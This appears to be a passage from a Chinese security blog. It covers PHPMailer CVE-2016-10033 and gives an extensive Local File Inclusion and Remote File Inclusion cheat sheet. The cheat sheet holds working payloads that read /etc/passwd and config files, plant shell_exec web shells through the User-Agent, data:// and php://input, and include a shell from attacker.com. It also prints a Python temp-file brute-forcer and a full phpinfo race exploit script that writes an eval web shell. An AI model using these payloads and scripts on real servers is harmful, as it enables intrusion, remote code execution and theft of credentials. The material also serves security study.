&#x27;[!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;)&#x27; .</span><br><span class="line">                    &#x27;(?&gt;\.(?&gt;[!#-\&#x27;*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;))*&#x27; .</span><br><span class="line">                    &#x27;@(?&gt;(?![a-z0-9-]&#123;64,&#125;)(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]&#123;64,&#125;)&#x27; .</span><br><span class="line">                    &#x27;(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?))&#123;0,126&#125;|\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]&#123;1,4&#125;)(?&gt;:&#x27; .</span><br><span class="line">                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;7&#125;|(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?&#x27; .</span><br><span class="line">                    &#x27;::(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:&#x27; .</span><br><span class="line">                    &#x27;[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:|(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;)?&#x27; .</span><br><span class="line">                    &#x27;::(?&gt;(?:[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;&#x27; .</span><br><span class="line">                    &#x27;|[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;|[1-9]?[0-9]))&#123;3&#125;))\])$/isD&#x27;,</span><br><span class="line">                    $address</span><br><span class="line">                );</span><br><span class="line">            case &#x27;html5&#x27;:</span><br><span class="line">                /**</span><br><span class="line">                 * This is the pattern used in the HTML5 spec for validation of &#x27;email&#x27; type form input elements.</span><br><span class="line">                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)</span><br><span class="line">                 */</span><br><span class="line">                return (boolean)preg_match(</span><br><span class="line">                    &#x27;/^[a-zA-Z0-9.!#$%&amp;\&#x27;*+\/=?^_`&#123;|&#125;~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;&#x27; .</span><br><span class="line">                    &#x27;[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$/sD&#x27;,</span><br><span class="line">                    $address</span><br><span class="line">                );</span><br><span class="line">            case &#x27;noregex&#x27;:</span><br><span class="line">                //No PCRE! Do something _very_ approximate!</span><br><span class="line">                //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span><br><span class="line">                return (strlen($address) &gt;= 3</span><br><span class="line">                    and strpos($address, &#x27;@&#x27;) &gt;= 1</span><br><span class="line">                    and strpos($address, &#x27;@&#x27;) != strlen($address) - 1);</span><br><span class="line">            case &#x27;php&#x27;:</span><br><span class="line">            default:</span><br><span class="line">                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到这段可以分析出两个限制条件，php版本小于5.2.0并且不支持PCRE才有可能调用<code>  $patternselect = &#39;noregex&#39;;</code>,<br>假设版本小于5.2.0并且不支持PCRE，看一看<code>noregex</code>如何过滤的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;noregex&#x27;:</span><br><span class="line">    //No PCRE! Do something _very_ approximate!</span><br><span class="line">    //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span><br><span class="line">    return (strlen($address) &gt;= 3</span><br><span class="line">        and strpos($address, &#x27;@&#x27;) &gt;= 1</span><br><span class="line">        and strpos($address, &#x27;@&#x27;) != strlen($address) - 1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只要存在@并且长度大于等于3就好了，那这样就可以任意构造这个参数了。<br>接下来继续分析怎么构造会造成漏洞</p>
<p>这个漏洞的核心是因为php mail()函数漏洞引起的</p>
<p>首先看一下这个函数<code>http://www.w3school.com.cn/php/func_mail_mail.asp</code>的语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">  mail(to,subject,message,headers,parameters)</span><br><span class="line">参数	描述</span><br><span class="line">  to	必需。规定邮件的接收者。</span><br><span class="line">  subject	必需。规定邮件的主题。该参数不能包含任何换行字符。</span><br><span class="line">  message	必需。规定要发送的消息。</span><br><span class="line">  headers	必需。规定额外的报头，比如 From, Cc 以及 Bcc。</span><br><span class="line">  parameters	必需。规定 sendmail 程序的额外参数。</span><br></pre></td></tr></table></figure>

<p>声明：下面这段摘自绿盟博客，解释的至少比我易懂</p>
<p>在Linux系统上，mail函数在底层实现中，默认调用Linux的sendmail程序发送邮件。在sendmail程序的参数中，有一个-X选项，用于记录所有的邮件进出流量至log文件中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; -X logfile</span><br><span class="line"> &gt; Log all traffic in and out of mailers in the indicated log</span><br><span class="line"> &gt; file. This should only be used as a last resort for debugging</span><br><span class="line"> &gt; mailer bugs. It will log a lot of data very quickly.</span><br></pre></td></tr></table></figure>
<p>通过-X指定log文件记录邮件流量，实际可以达到写文件的效果。<br>例如，如下php代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$to = &#x27;Alice@example.com&#x27;;</span><br><span class="line">$subject = &#x27;Hello Alice!&#x27;;</span><br><span class="line">$message=‘&lt;?php phhpinfo(); ?&gt;’；</span><br><span class="line"> $headers = &quot;CC: somebodyelse@example.com&quot;;</span><br><span class="line">$options = &#x27;-OQueueDirectory=/tmp -X/var/www/html/rce.php&#x27;;</span><br><span class="line">mail($to, $subject, $message, $headers, $options);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>执行后，查看log文件/var/www/html/rce.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">17220 &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> 17220 &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> 17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php</span><br><span class="line"> 17220 &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> 17220 &lt;&lt;&lt;</span><br><span class="line"> 17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;</span><br><span class="line"> 17220 &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure>
<p>发现被写入了包含在邮件标题或正文中的php代码，通过访问此log文件可以执行预先可控的php代码。<br><img lazyload src="/images/loading.svg" data-src="c237df30-d39e-11e6-9721-58f983ffda0a.png" alt="image"></p>
<p>关于POC可以看一下这些文章</p>
<p><a class="link" target="_blank" rel="noopener" href="https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html">https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">http://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://blog.nsfocus.net/multiple-php-mail-function-vulnerability-analysis/?utm_source=tuicool&amp;utm_medium=referral">http://blog.nsfocus.net/multiple-php-mail-function-vulnerability-analysis/?utm_source=tuicool&amp;utm_medium=referral<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Thu Jan 05 2017 21:00:00 GMT+0800">2017-01-05</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/PHP/">PHP</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/PHPMailer%20%3C%205.2.18%20Remote%20Code%20Execution(CVE-2016-10033)/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Local%20File%20Inclusion%20and%20Remote%20File%20Inclusion/">
                        Local File Inclusion and Remote File Inclusion
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        Local File Inclusion防御策略文件上传
大小
类型
存储位置
内容安全
访问权限
名称随机化

文件下载
下载路径
敏感信息
访问权限

阿里云OSS安全 https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y
1) Direct Local Include1http://site.com/lfi.php?page=/etc/passwd



2) php://filterphp://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include；
123http://www.site.com/lfi.php?page=php://filter/resource=config.phphttp://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php

3) /proc/self/environRequest’s user agent can be found there
用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用
123GET /lfi.php?page=/proc/self/environ&amp;cmd=id HTTP/1.1Host: www.site.comUser-Agent: &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;

4) Including imagesIf image.jpg contains php code it will be interpreted.
1http://www.site.com/lfi.php?page=upload/image.jpg

5) Zip and Phar wrappersFile must be zip archive with any extension
phar://伪协议 &gt;&gt; 数据流包装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。
用法：?file=phar://压缩包/内部文件
123http://www.site.com/lfi.php?page=zip://image.zip#shell.phphttp://www.site.com/lfi.php?page=phar://image.phar#shell.php

6) File UploadIt requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.

Upload a file and trigger a self-inclusion
Repeat step 1 until successful attack
Bruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}
Shell

We have 62**6 possible values -&gt; 56800235584 filenames for temporary uploaded filesBirthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.
12345678910111213141516171819import itertoolsimport requestsimport sysprint(&#x27;[+] Trying to win the race&#x27;)f = &#123;&#x27;file&#x27;: open(&#x27;shell.php&#x27;, &#x27;rb&#x27;)&#125;for _ in range(4096 * 4096):    requests.post(&#x27;http://target.com/index.php?c=index.php&#x27;, f)print(&#x27;[+] Bruteforcing the inclusion&#x27;)for fname in itertools.combinations(string.ascii_letters + string.digits, 6):    url = &#x27;http://target.com/index.php?c=/tmp/php&#x27; + fname    r = requests.get(url)    if &#x27;load average&#x27; in r.text:  # &lt;?php echo system(&#x27;uptime&#x27;);        print(&#x27;[+] We have got a shell: &#x27; + url)        sys.exit(0)print(&#x27;[x] Something went wrong, please try again&#x27;)

It is possible to send 20 files in one request that will be accepted by the server.
7) Session Files12345Session文件一般存放在/tmp/、/var/lib/php/session/、/var/lib/php/session/等目录下，文件名字一般以sess_SESSIONID来保存。首先，查看找到session文件并包含一次：文件名可以通过firefox的fire cookie插件查看当前session值。实际应用过程中需要注意以下几点：1)    网站可能没有生成临时session，以cookie方式保存用户信息，或者根本就完全没有。2)    Session文件内容的控制，这个时候我们就需要先通过包含查看当前session的内容，看session值中有没有我们可控的某个变量，比如url中的变量值。或者当前用户名username。如果有的话，我们就可以通过修改可控变量值控制恶意代码写入session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的session文件的。我们控制使服务器报错的语句即可将恶意代码写入session。

8) PHPInfo Script1&lt;?php phpinfo(); ?&gt; 

9) 结合phpinfo包含临时文件php有个特性是我们向服务器上任意php文件post请求上传数据时，都会生成临时文件，默认是传到tmp目录下，并且文件名是随机的。当然，我们可以暴力猜解，但是这样子还是太过鸡肋的。国外一个安全研究者提出利用phpinfo来找出所上传的文件路径，因为phpinfo会记录一些请求，包括在服务器上生成的临时文件名字和目录。所以借助phpinfo()我们可以找出临时文件名并利用。
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/env python# encoding=utf-8# Author : idwar# http://secer.org&#x27;&#x27;&#x27;可能需要你改的几个地方：1、host2、port3、request中的phpinfo页面名字及路径4、hello_lfi() 函数中的url，即存在lfi的页面和参数5、如果不成功或报错，尝试增加padding长度到7000、8000试试6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改 Good Luck :)&#x27;&#x27;&#x27;import reimport urllib2import hashlibfrom socket import *from time import sleephost = &#x27;192.168.92.132&#x27;#host = gethostbyname(domain)port = 80shell_name = hashlib.md5(host).hexdigest() + &#x27;.php&#x27;pattern = re.compile(r&#x27;&#x27;&#x27;\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]&#x27;&#x27;&#x27;)payload = &#x27;&#x27;&#x27;idwar&lt;?php fputs(fopen(&#x27;./&#x27;&#x27;&#x27; + shell_name + &#x27;&#x27;&#x27;\&#x27;,&quot;w&quot;),&quot;idwar was here&lt;?php eval(\$_POST[a]);?&gt;&quot;)?&gt;\r&#x27;&#x27;&#x27;req = &#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&#x27;&#x27;&#x27; % payloadpadding=&#x27;A&#x27; * 8000request=&#x27;&#x27;&#x27;POST /test/1.php?a=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27; HTTP/1.0\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27;\rHTTP_ACCEPT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\rHTTP_USER_AGENT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\rHTTP_ACCEPT_LANGUAGE: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\rHTTP_PRAGMA: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&#x27;&#x27;&#x27; % (len(req), host, req)def hello_lfi():    while 1:        s = socket(AF_INET, SOCK_STREAM)        s.connect((host, port))        s.send(request)        data = &#x27;&#x27;        while r&#x27;&lt;/body&gt;&lt;/html&gt;&#x27; not in data:            data = s.recv(9999)            search_ = re.search(pattern, data)            if search_:                tmp_file_name = search_.group(1)                url = r&#x27;http://192.168.92.132/test/2.php?s=%s%%00&#x27; % tmp_file_name                print url                search_request = urllib2.Request(url)                search_response = urllib2.urlopen(search_request)                html_data = search_response.read()                if &#x27;idwar&#x27; in html_data:                    s.close()                    return &#x27;\nDone. Your webshell is : \n\n%s\n&#x27; % (&#x27;http://&#x27; + host + &#x27;/&#x27; + shell_name)                    #import sys;sys.exit()        s.close()if __name__ == &#x27;__main__&#x27;:    print hello_lfi()    print &#x27;\n Good Luck :)&#x27;



10) Logs包含web server日志文件
不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。
直接访问test.php?file=../&lt;?php phpinfo();?&gt;.php，将会被记录下来。这样便成功将php代码写进log文件。
FTP日志文件内容
用户名填：&lt;?php phpinfo();?&gt;
Remote File InclusionWorks when allow_url_include in php.ini is set to TRUE
1) Direct Remote IncludeIncluding php file in text format directly
1http://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt

2) Data:text/plainIncluding php code through data stream
data://伪协议 &gt;&gt; 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；
123http://www.site.com/lfi.php?page=data:text/plain;,&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=

3) php://input?file=php://input 数据利用POST传过去
123456POST /lfi.php?page=php://input&amp;cmd=cd HTTP/1.1Host: www.site.comContent-Lenth: 39&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;

Fighting with extensions1) Null BytesAdd null byte that will terminate string
123http://www.site.com/lfi.php?page=/etc/passwd%00http://www.site.com/lfi.php?page=/etc/passwd%2500

2) TruncationCut extension by creating long string
1http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd

1http://www.site.com/lfi.php?page=/etc/passwd..............................

1http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\







参考：
利用本地包含漏洞执行任意代码
CTF-WIKI
LFIboomCTF

                    
                </div> -->
                <div class="article-content markdown-body">
                    <h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><ul>
<li>大小</li>
<li>类型</li>
<li>存储位置</li>
<li>内容安全</li>
<li>访问权限</li>
<li>名称随机化</li>
</ul>
<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><ul>
<li>下载路径</li>
<li>敏感信息</li>
<li>访问权限</li>
</ul>
<p>阿里云OSS安全 <a class="link" target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y">https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="1-Direct-Local-Include"><a href="#1-Direct-Local-Include" class="headerlink" title="1) Direct Local Include"></a>1) Direct Local Include</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/lfi.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>



<h4 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2) php://filter"></a>2) php://filter</h4><p>php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=php://filter/resource=config.php</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure>

<h4 id="3-proc-self-environ"><a href="#3-proc-self-environ" class="headerlink" title="3) /proc/self/environ"></a>3) /proc/self/environ</h4><p>Request’s user agent can be found there</p>
<p>用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /lfi.php?page=/proc/self/environ&amp;cmd=id HTTP/1.1</span><br><span class="line">Host: www.site.com</span><br><span class="line">User-Agent: &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="4-Including-images"><a href="#4-Including-images" class="headerlink" title="4) Including images"></a>4) Including images</h4><p>If image.jpg contains php code it will be interpreted.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=upload/image.jpg</span><br></pre></td></tr></table></figure>

<h4 id="5-Zip-and-Phar-wrappers"><a href="#5-Zip-and-Phar-wrappers" class="headerlink" title="5) Zip and Phar wrappers"></a>5) Zip and Phar wrappers</h4><p>File must be zip archive with any extension</p>
<p>phar://伪协议 &gt;&gt; 数据流包装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
<p>用法：?file=phar://压缩包/内部文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=zip://image.zip#shell.php</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=phar://image.phar#shell.php</span><br></pre></td></tr></table></figure>

<h4 id="6-File-Upload"><a href="#6-File-Upload" class="headerlink" title="6) File Upload"></a>6) File Upload</h4><p>It requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.</p>
<ol>
<li>Upload a file and trigger a self-inclusion</li>
<li>Repeat step 1 until successful attack</li>
<li>Bruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}</li>
<li>Shell</li>
</ol>
<p>We have 62**6 possible values -&gt; 56800235584 filenames for temporary uploaded files<br>Birthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Trying to win the race&#x27;</span>)</span><br><span class="line">f = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4096</span> * <span class="number">4096</span>):</span><br><span class="line">    requests.post(<span class="string">&#x27;http://target.com/index.php?c=index.php&#x27;</span>, f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Bruteforcing the inclusion&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> itertools.combinations(string.ascii_letters + string.digits, <span class="number">6</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://target.com/index.php?c=/tmp/php&#x27;</span> + fname</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;load average&#x27;</span> <span class="keyword">in</span> r.text:  <span class="comment"># &lt;?php echo system(&#x27;uptime&#x27;);</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] We have got a shell: &#x27;</span> + url)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[x] Something went wrong, please try again&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>It is possible to send 20 files in one request that will be accepted by the server.</p>
<h4 id="7-Session-Files"><a href="#7-Session-Files" class="headerlink" title="7) Session Files"></a>7) Session Files</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Session文件一般存放在/tmp/、/var/lib/php/session/、/var/lib/php/session/等目录下，文件名字一般以sess_SESSIONID来保存。</span><br><span class="line">首先，查看找到session文件并包含一次：文件名可以通过firefox的fire cookie插件查看当前session值。</span><br><span class="line">实际应用过程中需要注意以下几点：</span><br><span class="line">1)    网站可能没有生成临时session，以cookie方式保存用户信息，或者根本就完全没有。</span><br><span class="line">2)    Session文件内容的控制，这个时候我们就需要先通过包含查看当前session的内容，看session值中有没有我们可控的某个变量，比如url中的变量值。或者当前用户名username。如果有的话，我们就可以通过修改可控变量值控制恶意代码写入session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的session文件的。我们控制使服务器报错的语句即可将恶意代码写入session。</span><br></pre></td></tr></table></figure>

<h4 id="8-PHPInfo-Script"><a href="#8-PHPInfo-Script" class="headerlink" title="8) PHPInfo Script"></a>8) PHPInfo Script</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt; </span><br></pre></td></tr></table></figure>

<h4 id="9-结合phpinfo包含临时文件"><a href="#9-结合phpinfo包含临时文件" class="headerlink" title="9) 结合phpinfo包含临时文件"></a>9) 结合phpinfo包含临时文件</h4><p>php有个特性是我们向服务器上任意php文件post请求上传数据时，都会生成临时文件，默认是传到tmp目录下，并且文件名是随机的。当然，我们可以暴力猜解，但是这样子还是太过鸡肋的。国外一个安全研究者提出利用phpinfo来找出所上传的文件路径，因为phpinfo会记录一些请求，包括在服务器上生成的临时文件名字和目录。所以借助phpinfo()我们可以找出临时文件名并利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 